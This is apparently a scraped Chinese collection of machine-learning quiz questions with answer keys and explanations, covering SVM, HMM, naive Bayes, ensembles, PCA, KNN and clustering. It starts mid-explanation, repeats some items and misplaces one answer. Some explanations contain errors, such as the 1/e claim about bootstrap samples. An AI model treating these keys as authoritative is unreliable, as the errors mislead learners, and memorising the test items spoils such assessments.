答案：B解析：二分类：每个分类器只能把样本分为两类。监狱里的样本分别为狱警、小偷、送餐员、其他。二分类肯 定行不通。瓦普尼克95年提出来基础的支持向量机就是个二分类的分类器，这个分类器学习过 程就是解一个基于正负二分类推导而来的一个最优规划问题（对偶问题），要解决多分类问题 就要用决策树把二分类的分类器级联，VC维的概念就是说的这事的复杂度。层次聚类： 创建一个层次等级以分解给定的数据集。监狱里的对象分别是狱警、小偷、送餐员、或者其 他，他们等级应该是平等的，所以不行。此方法分为自上而下（分解）和自下而上（合并）两种操作方式。K-中心点聚类：挑选实际对象来代表簇，每个簇使用一个代表对象。它是围绕中心点划分的一种规则，所以这里并不合适。回归分析：处理变量之间具有相关性的一种统计方法，这里的狱警、小偷、送餐员、其他之间并没有什 么直接关系。结构分析： 结构分析法是在统计分组的基础上，计算各组成部分所占比重，进而分析某一总体现象的内部结构特征、总体的性质、总体内部结构依时间推移而表现出的变化规律性的统计方法。结构分析法的基本表现形式，就是计算结构指标。这里也行不通。多分类问题： 针对不同的属性训练几个不同的弱分类器，然后将它们集成为一个强分类器。这里狱警、 小偷、送餐员 以及他某某，分别根据他们的特点设定依据，然后进行区分识别。 贝叶斯 NB1、Nave Bayes(朴素贝叶斯)是一种特殊的Bayes分类器,特征变量是X,类别标签是C,它的一个假定是（）A 各类别的先验概率P(C)是相等的B 以0为均值，sqr(2)/2为标准差的正态分布C 特征变量X的各个维度是类别条件独立随机变量D P(X|C)是高斯分布 答案：C解析：朴素贝叶斯的基本假设就是每个变量相互独立。 7、假定某同学使用Naive Bayesian（NB）分类模型时，不小心将训练数据的两个维度搞重复了，那么关于NB的说法中不正确的是？A 模型效果相比无重复特征的情况下精确度会降低B 如果所有特征都被重复一遍，得到的模型预测结果相对于不重复的情况下的模型预测结果一样C 当两列特征高度相关时，无法用两列特征相同时所得到的结论来分析问题 答案：B解析：朴素贝叶斯的条件就是每个变量相互独立。在贝叶斯理论系统中，都有一个重要的条件独立性假设：假设所有特征之间相互独立，这样才能将联合概率拆分。此外，若高度相关的特征在模型中引入两次, 这样增加了这一特征的重要性, 则它的性能因数据包含高度相关的特征而下降。正确做法是评估特征的相关矩阵，并移除那些高度相关的特征。 7、符号集 a 、 b 、 c 、 d ，它们相互独立，相应概率为 1/2 、 1/4 、 1/8/ 、 1/16 ，其中包含信息量最小的符号是（ ）A aB bC cD d 答案：A解析：因为消息出现的概率越小，则消息中所包含的信息量就越大。因此选a,同理d信息量最大。 HMM9、隐马尔可夫模型三个基本问题以及相应的算法说法错误的是（ ）A 评估—前向后向算法B 解码—维特比算法C 学习—Baum-Welch算法D 学习—前向后向算法 答案：D解析：评估问题，可以使用前向算法、后向算法、前向后向算法。 9、解决隐马模型中预测问题的算法是A 前向算法B 后向算法C Baum-Welch算法D 维特比算法 答案：D解析：@刘炫320，本题题目及解析来源：http://blog.csdn.net/column/details/16442.htmlA、B：前向、后向算法解决的是一个评估问题，即给定一个模型，求某特定观测序列的概率，用于评估该序列最匹配的模型。C：Baum-Welch算法解决的是一个模型训练问题，即参数估计，是一种无监督的训练方法，主要通过EM迭代实现；D：维特比算法解决的是给定 一个模型和某个特定的输出序列，求最可能产生这个输出的状态序列。如通过海藻变化（输出序列）来观测天气（状态序列），是预测问题，通信中的解码问题。 6、在HMM中,如果已知观察序列和产生观察序列的状态序列,那么可用以下哪种方法直接进行参数估计（）A EM算法B 维特比算法C 前向后向算法D 极大似然估计 答案：D解析：EM算法： 只有观测序列，无状态序列时来学习模型参数，即Baum-Welch算法维特比算法： 用动态规划解决HMM的预测问题，不是参数估计前向后向算法：用来算概率极大似然估计：即观测序列和相应的状态序列都存在时的监督学习算法，用来估计参数注意的是在给定观测序列和对应的状态序列估计模型参数，可以利用极大似然发估计。如果给定观测序列，没有对应的状态序列，才用EM，将状态序列看不不可测的隐数据。 5、在HMM中,如果已知观察序列和产生观察序列的状态序列,那么可用以下哪种方法直接进行参数估计()A EM算法B 维特比算法C 前向后向算法D 极大似然估计 答案：D解析：EM算法： 只有观测序列，无状态序列时来学习模型参数，即Baum-Welch算法维特比算法： 用动态规划解决HMM的预测问题，不是参数估计前向后向算法：用来算概率极大似然估计：即观测序列和相应的状态序列都存在时的监督学习算法，用来估计参数注意的是在给定观测序列和对应的状态序列估计模型参数，可以利用极大似然发估计。如果给定观测序列，没有对应的状态序列，才用EM，将状态序列看不不可测的隐数据。 8、请选择下面可以应用隐马尔科夫(HMM)模型的选项A 基因序列数据集B 电影浏览数据集C 股票市场数据集D 所有以上 答案：D解析：只要是和时间序列问题有关的 , 都可以试试HMM 6、下列哪个不属于CRF模型对于HMM和MEMM模型的优势（ ）A 特征灵活B 速度快C 可容纳较多上下文信息D 全局最优答案： B解析：CRF 的优点：特征灵活，可以容纳较多的上下文信息，能够做到全局最优CRF 的缺点：速度慢CRF没有HMM那样严格的独立性假设条件，因而可以容纳任意的上下文信息。特征设计灵活（与ME一样） ————与HMM比较同时，由于CRF计算全局最优输出节点的条件概率，它还克服了最大熵马尔可夫模型标记偏置（Label-bias）的缺点。 ­­————与MEMM比较 CRF是在给定需要标记的观察序列的条件下，使用维特比算法，计算整个标记序列的联合概率分布，而不是在给定当前状态条件下，定义下一个状态的状态分布。————与ME比较 SVM5、假如我们使用非线性可分的SVM目标函数作为最优化对象, 我们怎么保证模型线性可分？A 设C=1B 设C=0C 设C=无穷大D 以上都不对 答案：C解析：无穷大保证了所有的线性不可分都是可以忍受的.最大间距分类只有当参数 C 是非常大的时候才起效，模型会过拟合。 6、训练完SVM模型后, 不是支持向量的那些样本我们可以丢掉, 也可以继续分类A 正确B 错误 答案：A解析：SVM模型中, 真正影响决策边界的是支持向量 4、关于支持向量机SVM,下列说法错误的是（）A L2正则项，作用是最大化分类间隔，使得分类器拥有更强的泛化能力B Hinge 损失函数，作用是最小化经验分类错误C 分类间隔为1/||w||，||w||代表向量的模D 当参数C越小时，分类间隔越大，分类错误越多，趋于欠学习 答案：C解析：A正确。考虑加入正则化项的原因：想象一个完美的数据集，y&gt;1是正类，y&lt;-1是负类，决策面y=0，加入一个y=-30的正类噪声样本，那么决策面将会变“歪”很多，分类间隔变小，泛化能力减小。加入正则项之后，对噪声样本的容错能力增强，前面提到的例子里面，决策面就会没那么“歪”了，使得分类间隔变大，提高了泛化能力。 Hinge 可以用来解 间距最大化 的问题，最有代表性的就是SVM 问题，详见：https://blog.csdn.net/u010976453/article/details/78488279 10、有两个样本点，第一个点为正样本,它的特征向量是(0,-1);第二个点为负样本,它的特征向量是(2,3),从这两个样本点组成的训练集构建一个线性SVM分类器的分类面方程是( )A 2x+y=4B x+2y=5C x+2y=3D 2x-y=0 答案：C解析：这道题简化了，对于两个点来说，最大间隔就是垂直平分线，因此求出垂直平分线即可。斜率是两点连线的斜率的负倒数-1/((-1-3)/(0-2)) = -1/2, 可得y=-(1/2)x + c, 过中点((0+2)/2, (-1+3)/2) = (1, 1), 可得c=3/2, 故选C. 10、关于logit 回归和SVM 不正确的是（ ） 和下题矛盾A Logit回归本质上是一种根据样本对权值进行极大似然估计的方法，而后验概率正比于先验概率和似然函数的乘积。logit仅仅是最大化似然函数，并没有最大化后验概率，更谈不上最小化后验概率。B Logit回归的输出就是样本属于正类别的几率，可以计算出概率。C SVM的目标是找到使得训练数据尽可能分开且分类间隔最大的超平面，应该属于结构风险最小化。D SVM可以通过正则化系数控制模型的复杂度，避免过拟合。 答案：A解析：Logit回归目标函数是最小化后验概率，SVM目标是结构风险最小化，SVM可以有效避免模型过拟合。 9、关于 logit 回归和 SVM 不正确的是（）A Logit回归目标函数是最小化后验概率B Logit回归可以用于预测事件发生概率的大小C SVM目标是结构风险最小化D SVM可以有效避免模型过拟合 答案：A解析：A. Logit回归本质上是一种根据样本对权值进行极大似然估计的方法，而后验概率正比于先验概率和似然函数的乘积。logit仅仅是最大化似然函数，并没有最大化后验概率，更谈不上最小化后验概率。而最小化后验概率是朴素贝叶斯算法要做的。A错误B. Logit回归的输出就是样本属于正类别的几率，可以计算出概率，正确C. SVM的目标是找到使得训练数据尽可能分开且分类间隔最大的超平面，应该属于结构风险最小化。D. SVM可以通过正则化系数控制模型的复杂度，避免过拟合。 10、下图是同一个SVM模型, 但是使用了不同的径向基核函数的gamma参数, 依次是g1, g2, g3 , 下面大小比较正确的是Ag1 &gt; g2 &gt; g3Bg1 = g2 = g3Cg1 &lt; g2 &lt; g3Dg1 &gt;= g2 &gt;= g3E. g1 &lt;= g2 &lt;= g3 答案：C解析：所谓径向基函数 (Radial Basis Function 简称 RBF), 就是某种沿径向对称的标量函数。 通常定义为空间中任一点x到某一中心点xc之间欧氏距离的单调函数 , 可记作 k(||x-xc||), 其作用往往是局部的 , 即当x远离xc时函数取值很小。最常用的径向基函数是高斯核函数 ,形式为 k(||x-xc||)=exp{- ||x-xc||^2/(2σ^2) } 其中xc为核函数中心,σ为函数的宽度参数 , 控制了函数的径向作用范围。由radial basis: exp(-gamma|u-v|^2)可知, gamma越小, 模型越简单, 平滑度越好, 分类边界越不容易过拟合, 所以选C。 8、下列不是SVM核函数的是A 多项式核函数B logistic核函数C 径向基核函数D Sigmoid核函数 答案： B解析：SVM核函数包括线性核函数、多项式核函数、径向基核函数、高斯核函数、幂指数核函数、拉普拉斯核函数、ANOVA核函数、二次有理核函数、多元二次核函数、逆多元二次核函数以及Sigmoid核函数. 核函数的定义并不困难，根据泛函的有关理论，只要一种函数 K(xi, xj) 满足Mercer条件，它就对应某一变换空间的内积．对于判断哪些函数是核函数到目前为止也取得了重要的突破，得到Mercer定理和以下常用的核函数类型：(1)线性核函数K ( x , x i ) = x ⋅ x i(2)多项式核K ( x , x i ) = ( ( x ⋅ x i ) + 1 ) d(3)径向基核（RBF）K ( x , x i ) = exp ( − ∥ x − x i ∥ 2 σ 2 )Gauss径向基函数则是局部性强的核函数，其外推能力随着参数 σ 的增大而减弱。多项式形式的核函数具有良好的全局性质。局部性较差。(4)傅里叶核K ( x , x i ) = 1 − q 2 2 ( 1 − 2 q cos ( x − x i ) + q 2 )(5)样条核K ( x , x i ) = B 2 n + 1 ( x − x i )(6)Sigmoid核函数K ( x , x i ) = tanh ( κ ( x , x i ) − δ )采用Sigmoid函数作为核函数时，支持向量机实现的就是一种多层感知器神经网络，应用SVM方法，隐含层节点数目(它确定神经网络的结构)、隐含层节点对输入节点的权值都是在设计(训练)的过程中自动确定的。而且支持向量机的理论基础决定了它最终求得的是全局最优值而不是局部最小值，也保证了它对于未知样本的良好泛化能力而不会出现过学习现象。 核函数的选择在选取核函数解决实际问题时，通常采用的方法有：一是利用专家的先验知识预先选定核函数；二是采用Cross-Validation方法，即在进行核函数选取时，分别试用不同的核函数，归纳误差最小的核函数就是最好的核函数．如针对傅立叶核、RBF核，结合信号处理问题中的函数回归问题，通过仿真实验，对比分析了在相同数据条件下，采用傅立叶核的SVM要比采用RBF核的SVM误差小很多．三是采用由Smits等人提出的混合核函数方法，该方法较之前两者是目前选取核函数的主流方法，也是关于如何构造核函数的又一开创性的工作．将不同的核函数结合起来后会有更好的特性，这是混合核函数方法的基本思想． 决策树、随机森林、提升算法2、对于信息增益, 决策树分裂节点, 下面说法正确的是（）1 纯度高的节点需要更多的信息去区分2 信息增益可以用”1比特-熵”获得3 如果选择一个属性具有许多归类值, 那么这个信息增益是有偏差的A 1B 2C 2和3D 所有以上 答案：C 3、我们想在大数据集上训练决策树, 为了使用较少时间, 我们可以A 增加树的深度B 增加学习率 (learning rate)C 减少树的深度D 减少树的数量 答案：C解析：增加树的深度, 会导致所有节点不断分裂, 直到叶子节点是纯的为止. 所以, 增加深度, 会延长训练时间.决策树没有学习率参数可以调. (不像集成学习和其它有步长的学习方法)决策树只有一棵树, 不是随机森林。 4、对于随机森林和GradientBoosting Trees, 下面说法正确的是:1.在随机森林的单个树中, 树和树之间是有依赖的, 而GradientBoosting Trees中的单个树之间是没有依赖的.2.这两个模型都使用随机特征子集, 来生成许多单个的树.3.我们可以并行地生成GradientBoosting Trees单个树, 因为它们之间是没有依赖的, GradientBoosting Trees训练模型的表现总是比随机森林好A 2B 1 and 2C 1 and 3D 2 and 3 答案：A解析：1.随机森林是基于bagging的, 而Gradient Boosting trees是基于boosting的, 所有说反了,在随机森林的单个树中, 树和树之间是没有依赖的, 而GradientBoosting Trees中的单个树之间是有依赖关系.2.这两个模型都使用随机特征子集, 来生成许多单个的树.所以A是正确的 3、bootstrap数据是什么意思？（提示：考“bootstrap”和“boosting”区别）A 有放回地从总共M个特征中抽样m个特征B 无放回地从总共M个特征中抽样m个特征C 有放回地从总共N个样本中抽样n个样本D 无放回地从总共N个样本中抽样n个样本 答案：C解析：boostrap是提鞋自举的意思(武侠小说作者所说的左脚踩右脚腾空而起). 它的过程是对样本(而不是特征)进行有放回的抽样, 抽样次数等同于样本总数. 这个随机抽样过程决定了最终抽样出来的样本, 去除重复之后, 占据原有样本的1/e比例. 5、数据科学家可能会同时使用多个算法（模型）进行预测， 并且最后把这些算法的结果集成起来进行最后的预测（集成学习），以下对集成学习说法正确的是A 单个模型之间有高相关性B 单个模型之间有低相关性C 在集成学习中使用“平均权重”而不是“投票”会比较好D 单个模型都是用的一个算法 答案：B 2、以下说法中错误的是（）A SVM对噪声（如来自其他分部的噪声样本）具备鲁棒性B 在adaboost算法中，所有被分错样本的权重更新比例不相同C boosting和bagging都是组合多个分类器投票的方法，二者都是根据单个分类器的正确率确定其权重D 给定n个数据点，如果其中一半用于训练，一半用户测试，则训练误差和测试误差之间的差别会随着n的增加而减少的 答案：C解析：A 软间隔分类器对噪声是有鲁棒性的。B 请参考http://blog.csdn.net/v_july_v/article/details/40718799C boosting是根据分类器正确率确定权重，bagging不是。D 训练集变大会提高模型鲁棒性。 8、下面对集成学习模型中的弱学习者描述错误的是？A 他们经常不会过拟合B 他们通常带有高偏差，所以其并不能解决复杂学习问题C 他们通常会过拟合 答案：C解析：弱学习者是问题的特定部分。所以他们通常不会过拟合，这也就意味着弱学习者通常拥有低方差和高偏差。 8、下面关于ID3算法中说法错误的是（）A ID3算法要求特征必须离散化B 信息增益可以用熵，而不是GINI系数来计算C 选取信息增益最大的特征，作为树的根节点D ID3算法是一个二叉树模型 答案：D解析：ID3算法（IterativeDichotomiser3迭代二叉树3代）是一个由RossQuinlan发明的用于决策树的算法。可以归纳为以下几点：使用所有没有使用的属性并计算与之相关的样本熵值选取其中熵值最小的属性生成包含该属性的节点 D3算法对数据的要求：1)所有属性必须为离散量；2)所有的训练例的所有属性必须有一个明确的值；3)相同的因素必须得到相同的结论且训练例必须唯一。 条件熵1、一个二进制源X发出符号集为{-1,1}，经过离散无记忆信道传输，由于信道中噪音的存在，接收端Y收到符号集为{-1,1,0}。已知P(x=-1)=1/4，P(x=1)=3/4，P(y=-1|x=-1)=4/5，P(y=0|x=-1)=1/5，P(y=1|x=1)=3/4，P(y=0|x=1)=1/4，求条件熵H(Y|X)（ ）A 0.2375B 0.3275C 0.5273D 0.5372 答案：A解析：信息熵公式：H(X)= -∑P(x)log(x)条件熵公式：H(Y|X)= -∑P(y,x)logP(y|x)= -∑P(y|x)P(x)logP(y|x)，将(y=-1,x=-1), (y=0,x=-1), (y=1,x=1), (y=0,x=1)四种情况带入公式求和，得 H(Y|X)≈-(-0.01938-0.03495-0.07028-0.11289)=0.2375。 9、目标变量在训练集上的 8 个实际值 [0,0,0,1,1,1,1,1]，目标变量的熵是多少？A -(5/8 log(5/8) + 3/8 log(3/8))B 5/8 log(5/8) + 3/8 log(3/8)C 3/8 log(5/8) + 5/8 log(3/8)D 5/8 log(3/8) – 3/8 log(5/8) 答案：A 特征选择1、下列哪个不属于常用的文本分类的特征选择算法？A 卡方检验值B 互信息C 信息增益D 主成分分析 答案：D解析：主成分分析是特征转换算法（特征抽取），而不是特征选择常采用特征选择方法。常见的六种特征选择方法：1）DF(Document Frequency) 文档频率DF:统计特征词出现的文档数量，用来衡量某个特征词的重要性2）MI(Mutual Information) 互信息法互信息法用于衡量特征词与文档类别直接的信息量。如果某个特征词的频率很低，那么互信息得分就会很大，因此互信息法倾向”低频”的特征词。相对的词频很高的词，得分就会变低，如果这词携带了很高的信息量，互信息法就会变得低效。3）(Information Gain) 信息增益法通过某个特征词的缺失与存在的两种情况下，语料中前后信息的增加，衡量某个特征词的重要性。4）CHI(Chi-square) 卡方检验法利用了统计学中的”假设检验”的基本思想：首先假设特征词与类别直接是不相关的如果利用CHI分布计算出的检验值偏离阈值越大，那么更有信心否定原假设，接受原假设的备则假设：特征词与类别有着很高的关联度。5）WLLR(Weighted Log Likelihood Ration)加权对数似然6）WFO（Weighted Frequency and Odds）加权频率和可能性本题解析来源：http://blog.csdn.net/ztf312/article/details/50890099 1、机器学习中做特征选择时，可能用到的方法有？A 卡方B 信息增益C 平均互信息D 期望交叉熵E 以上都有 答案：E 降维2、为了得到和 SVD 一样的投射（projection），你需要在 PCA 中怎样做？A 将数据转换成零均值B 将数据转换成零中位数C 无法做到 答案：A解析：当数据有一个 0 均值向量时，PCA 有与 SVD 一样的投射，否则在使用 SVD 之前，你必须将数据均值归 0。 2、下列方法中，不可以用于特征降维的方法包括A 主成分分析PCAB 线性判别分析LDAC 深度学习SparseAutoEncoderD 矩阵奇异值分解SVD 答案：C 解析：特征降维方法主要有：PCA，LLE，IsomapSVD和PCA类似，也可以看成一种降维方法LDA:线性判别分析，可用于降维AutoEncoder：AutoEncoder的结构与神经网络的隐含层相同，由输入L1,输出 L2组成，中间则是权重连接。Autoencoder通过L2得到输入的重构L3，最小化L3与L1的差别 进行训练得到权重。在这样的权重参数下，得到的L2可以尽可能的保存L1的信息。Autoencoder的输出L2的维度由输出的神经元个数决定。当输出维度大于L1时，则需要在训练目标函数中加入sparse 惩罚项，避免L2直接复制L1（权重全为1）。所以称为sparseAutoencoder( Andrew Ng提出的)。结论：SparseAutoencoder大多数情况下都是升维的，所以称之为特征降维的方法不准确。 4、下列哪些不特别适合用来对高维数据进行降维A LASSOB 主成分分析法C 聚类分析D 小波分析法E 线性判别法F 拉普拉斯特征映射 答案：C解析：lasso通过参数缩减达到降维的目的；pca就不用说了线性鉴别法即LDA通过找到一个空间使得类内距离最小类间距离最大所以可以看做是降维；小波分析有一些变换的操作降低其他干扰可以看做是降维拉普拉斯请看这个http://f.dataguru.cn/thread-287243-1-1.html 9、我们建立一个5000个特征, 100万数据的机器学习模型. 我们怎么有效地应对这样的大数据训练 :A 我们随机抽取一些样本, 在这些少量样本之上训练B 我们可以试用在线机器学习算法C 我们应用PCA算法降维, 减少特征数D B 和 CE A 和 BF 以上所有 答案：F解析：样本数过多, 或者特征数过多, 而不能单机完成训练, 可以用小批量样本训练, 或者在线累计式训练, 或者主成分PCA降维方式减少特征数量再进行训练. 10、我们想要减少数据集中的特征数, 即降维. 选择以下适合的方案 : 使用前向特征选择方法 使用后向特征排除方法 我们先把所有特征都使用, 去训练一个模型, 得到测试集上的表现. 然后我们去掉一个特征, 再去训练, 用交叉验证看看测试集上的表现. 如果表现比原来还要好, 我们可以去除这个特征. 查看相关性表, 去除相关性最高的一些特征A 1 和 2B 2, 3和4C 1, 2和4D All 答案：D解析：1.前向特征选择方法和后向特征排除方法是我们特征选择的常用方法2.如果前向特征选择方法和后向特征排除方法在大数据上不适用, 可以用这里第三种方法.3.用相关性的度量去删除多余特征, 也是一个好方法所有D是正确的 2、对于PCA(主成分分析)转化过的特征 , 朴素贝叶斯的”不依赖假设”总是成立, 因为所有主要成分是正交的, 这个说法是 :A 正确的B 错误的 答案：B解析：这个说法是错误的, 首先, “不依赖”和”不相关”是两回事, 其次, 转化过的特征, 也可能是相关的 3、对于PCA说法正确的是 : 我们必须在使用PCA前规范化数据 我们应该选择使得模型有最大variance的主成分 我们应该选择使得模型有最小variance的主成分 我们可以使用PCA在低维度上做数据可视化A 1, 2 and 4B 2 and 4C 3 and 4D 1 and 3E 1, 3 and 4 答案：A解析：1）PCA对数据尺度很敏感, 打个比方, 如果单位是从km变为cm, 这样的数据尺度对PCA最后的结果可能很有影响(从不怎么重要的成分变为很重要的成分).2）我们总是应该选择使得模型有最大variance的主成分3）有时在低维度上左图是需要PCA的降维帮助的 4、对于下图, 最好的主成分选择是多少 ?A 7B 30C 35D Can’t Say 答案：B解析：主成分选择使variance越大越好， 在这个前提下， 主成分越少越好。 10、最出名的降维算法是 PCA 和 t-SNE。将这两个算法分别应用到数据「X」上，并得到数据集「X_projected_PCA」，「X_projected_tSNE」。下面哪一项对「X_projected_PCA」和「X_projected_tSNE」的描述是正确的？A X_projected_PCA 在最近邻空间能得到解释B X_projected_tSNE 在最近邻空间能得到解释C 两个都在最近邻空间能得到解释D 两个都不能在最近邻空间得到解释 答案：B解析：t-SNE 算法考虑最近邻点而减少数据维度。所以在使用 t-SNE 之后，所降的维可以在最近邻空间得到解释。但 PCA 不能。 KNN3、使用k=1的knn算法, 下图二类分类问题, “+” 和 “o” 分别代表两个类, 那么, 用仅拿出一个测试样本的交叉验证方法, 交叉验证的错误率是多少：A 0%B 100%C 0%到100D 以上都不是 答案： B解析：knn算法就是, 在样本周围看k个样本, 其中大多数样本的分类是A类, 我们就把这个样本分成A类. 显然, k=1 的knn在上图不是一个好选择, 分类的错误率始终是100%。 9、以下哪个图是KNN算法的训练边界A BB AC DD CE 都不是 答案：B解析：KNN算法肯定不是线性的边界， 所以直的边界就不用考虑了。另外这个算法是看周围最近的k个样本的分类用以确定分类，所以边界一定是坑坑洼洼的。 10、一般，k-NN最近邻方法在（）的情况下效果较好A 样本较多但典型性不好B 样本较少但典型性好C 样本呈团状分布D 样本呈链状分布 答案： B（也有选A的），答案待定解析：K近邻算法主要依靠的是周围的点，因此如果样本过多，那肯定是区分不出来的。因此应当选择B样本呈团状颇有迷惑性，这里应该指的是整个样本都是呈团状分布，这样kNN就发挥不出其求近邻的优势了，整体样本应该具有典型性好，样本较少，比较适宜。 分类方法1、以下哪些方法不可以直接来对文本分类？A KmeansB 决策树C 支持向量机D KNN 答案：A解析：Kmeans是聚类方法，典型的无监督学习方法。分类是监督学习方法，BCD都是常见的分类方法。 2、以下( )不属于线性分类器最佳准则？A 感知准则函数B 贝叶斯分类C 支持向量机D Fisher准则 答案：B解析：线性分类器有三大类：感知器准则函数、SVM、Fisher准则，而贝叶斯分类器不是线性分类器。感知准则函数 ：准则函数以使错分类样本到分界面距离之和最小为原则。其优点是通过错分类样本提供的信息对分类器函数进行修正，这种准则是人工神经元网络多层感知器的基础。支持向量机 ：基本思想是在两类线性可分条件下，所设计的分类器界面使两类之间的间隔为最大，它的基本出发点是使期望泛化风险尽可能小。（使用核函数可解决非线性问题）Fisher 准则 ：更广泛的称呼是线性判别分析（LDA），将所有样本投影到一条远点出发的直线，使得同类样本距离尽可能小，不同类样本距离尽可能大，具体为最大化“广义瑞利商”。根据两类样本一般类内密集，类间分离的特点，寻找线性分类器最佳的法线向量方向，使两类样本在该方向上的投影满足类内尽可能密集，类间尽可能分开。这种度量通过类内离散矩阵 Sw 和类间离散矩阵 Sb 实现。 1、下面有关分类算法的准确率，召回率，F1 值的描述，错误的是？A 准确率是检索出相关文档数与检索出的文档总数的比率，衡量的是检索系统的查准率B 召回率是指检索出的相关文档数和文档库中所有的相关文档数的比率，衡量的是检索系统的查全率C 正确率、召回率和 F 值取值都在0和1之间，数值越接近0，查准率或查全率就越高D 为了解决准确率和召回率冲突问题，引入了F1分数 答案：C解析：对于二类分类问题常用的评价指标是精准度（precision）与召回率（recall）。通常以关注的类为正类，其他类为负类，分类器在测试数据集上的预测或正确或不正确，4种情况出现的总数分别记作：TP——将正类预测为正类数FN——将正类预测为负类数FP——将负类预测为正类数TN——将负类预测为负类数由此：精准率定义为：P = TP / (TP + FP)召回率定义为：R = TP / (TP + FN)F1值定义为： F1 = 2 P R / (P + R)精准率和召回率和F1取值都在0和1之间，精准率和召回率高，F1值也会高，不存在数值越接近0越高的说法，应该是数值越接近1越高。 3、假设我们要解决一个二类分类问题, 我们已经建立好了模型, 输出是0或1, 初始时设阈值为0.5, 超过0.5概率估计, 就判别为1, 否则就判别为0 ; 如果我们现在用另一个大于0.5的阈值, 那么现在关于模型说法, 正确的是 :1 模型分类的召回率会降低或不变2 模型分类的召回率会升高3 模型分类准确率会升高或不变4 模型分类准确率会降低A 1B 2C 1和3D 2和4E 以上都不是 答案：A解析：精确率, 准确率和召回率是广泛用于信息检索和统计学分类领域的度量值，用来评价结果的质量。下图可以帮助理解和记忆它们之间的关系, 其中精确率(precision)和准确率(accuracy)都是关于预测效果的描述. 召回率是关于预测样本的描述。精确率表示的是预测为正的样本中有多少是真正的正样本。那么预测为正就有两种可能了，一种就是把正类预测为正类(TP)，另一种就是把负类预测为正类(FP), 也就是P = TP / (TP + FP)。 准确率表示的是预测的正负样本有多少是真实的正和负, 预测正确的数量占全部预测数量的比例, 也就是A = (TP + TN) / (TP + FP + TN + FN) = (TP + TN) / 全部样本。 召回率表示的是样本中的正例有多少被预测正确了。那也有两种可能，一种是把原来的正类预测成正类(TP)，另一种就是把原来的正类预测为负类(FN), 也就是R = TP / (TP + FN)。精确率和召回率二者计算方法其实就是分母不同，一个分母是预测为正的样本数，另一个是原来样本中所有的正样本数。提高分界阈值大于0.5, 则预测为正的样本数要降低, 相当于把图中圆圈变小, 按下图则可计算 召回率的分子变小分母不变, 所以召回率会变小或不变;精确率的分子分母同步变化, 所以精确率的变化不能确定;准确率的分子为圆内绿色加圆外右侧矩形面积所围样本, 两者之和变化不能确定; 分母为矩形所含全部样本不变化, 所以准确率的变化不能确定;综上, 所以选A。 聚类算法答案：D解析：所有都可以用来调试以找到全局最小。 1、模式识别中，不属于马式距离（协方差距离）较之于欧式距离的优点的是（ ）A 平移不变性B 尺度不变性C 考虑了模式的分布 答案：A还有一种距离叫做曼哈顿距离 7、以下属于欧式距离特性的有（）A 旋转不变性B 尺度缩放不变性C 不受量纲影响的特性 答案：A 2、以下不属于影响聚类算法结果的主要因素有（）A 已知类别的样本质量B 分类准则C 特征选取D 模式相似性测度 答案：A 4、在 k-均值算法中，以下哪个选项可用于获得全局最小？A 尝试为不同的质心（centroid）初始化运行算法B 调整迭代的次数C 找到集群的最佳数量D 以上所有 3、影响基本K-均值算法的主要因素有（）A 样本输入顺序B 模式相似性测度C 聚类准则 答案：B 5、如果以特征向量的相关系数作为模式相似性测度，则影响聚类算法结果的主要因素有（ ）A 已知类别样本质量B 分类准则C 量纲 答案： B 5、以下对k-means聚类算法解释正确的是A 能自动识别类的个数,随即挑选初始点为中心点计算B 能自动识别类的个数,不是随即挑选初始点为中心点计算C 不能自动识别类的个数,随即挑选初始点为中心点计算D 不能自动识别类的个数,不是随即挑选初始点为中心点计算 答案：C解析：（1）适当选择c个类的初始中心；（2）在第k次迭代中，对任意一个样本，求其到c个中心的距离，将该样本归到距离最短的中心所在的类；（3）利用均值等方法更新该类的中心值；（4）对于所有的c个聚类中心，如果利用（2）（3）的迭代法更新后，值保持不变，则迭代结束，否则继续迭代。以上是KMeans（C均值）算法的具体步骤，可以看出需要选择类别数量，但初次选择是随机的，最终的聚类中心是不断迭代稳定以后的聚类中心。所以答案选C。 其他4、在统计模式分类问题中，当先验概率未知时，可以使用（）A 最小损失准则B 最小最大损失准则C 最小误判概率准则 答案：B 2、以下几种模型方法属于判别式模型(Discriminative Model)的有( )1)混合高斯模型2)条件随机场模型3)区分度训练4)隐马尔科夫模型A 2,3B 3,4C 1,4D 1,2 答案：A解析：常见的判别式模型有：Logistic regression（logistical 回归）Linear discriminant analysis（线性判别分析）Supportvector machines（支持向量机）Boosting（集成学习）Conditional random fields（条件随机场）Linear regression（线性回归）Neural networks（神经网络） 常见的生成式模型有:Gaussian mixture model and othertypes of mixture model（高斯混合及其他类型混合模型）Hidden Markov model（隐马尔可夫）NaiveBayes（朴素贝叶斯）AODE（平均单依赖估计）Latent Dirichlet allocation（LDA主题模型）Restricted Boltzmann Machine（限制波兹曼机）生成式模型是根据概率乘出结果，而判别式模型是给出输入，计算出结果。 10、在其他条件不变的前提下，以下哪种做法容易引起机器学习中的过拟合问题？A 增加训练集量B 减少神经网络隐藏层节点数C 删除稀疏的特征D SVM算法中使用高斯核/RBF核代替线性核 答案：D解析：一般情况下，越复杂的系统，过拟合的可能性就越高，一般模型相对简单的话泛化能力会更好一点。B.一般认为，增加隐层数可以降低网络误差（也有文献认为不一定能有效降低），提高精度，但也使网络复杂化，从而增加了网络的训练时间和出现“过拟合”的倾向， svm高斯核函数比线性核函数模型更复杂，容易过拟合D.径向基(RBF)核函数/高斯核函数的说明,这个核函数可以将原始空间映射到无穷维空间。对于参数 ，如果选的很大，高次特征上的权重实际上衰减得非常快，实际上（数值上近似一下）相当于一个低维的子空间；反过来，如果选得很小，则可以将任意的数据映射为线性可分——当然，这并不一定是好事，因为随之而来的可能是非常严重的过拟合问题。不过，总的来说，通过调整参数 ，高斯核实际上具有相当高的灵活性，也是 使用最广泛的核函数 之一。 4、“过拟合”只在监督学习中出现，在非监督学习中，没有“过拟合”，这是（）A 对的B 错的 答案： B解析：我们可以评估无监督学习方法通过无监督学习的指标，如：我们可以评估聚类模型通过调整兰德系数（adjusted rand score）https://en.wikipedia.org/wiki/Rand_index#Adjusted_Rand_index 8、下面哪个/些超参数的增加可能会造成随机森林数据过拟合？A 树的数量B 树的深度C 学习速率 答案：B解析：通常情况下，我们增加树的深度有可能会造成模型过拟合。学习速率并不是随机森林的超参数。增加树的数量可能会造成欠拟合。 5、假设你使用 log-loss 函数作为评估标准。下面这些选项，哪些是对作为评估标准的 log-loss 的正确解释。A 如果一个分类器对不正确的分类很自信，log-loss 会严重的批评它B 对一个特别的观察而言，分类器为正确的类别分配非常小的概率，然后对 log-loss 的相应分布会非常大C log-loss 越低，模型越好D 以上都是 答案：D 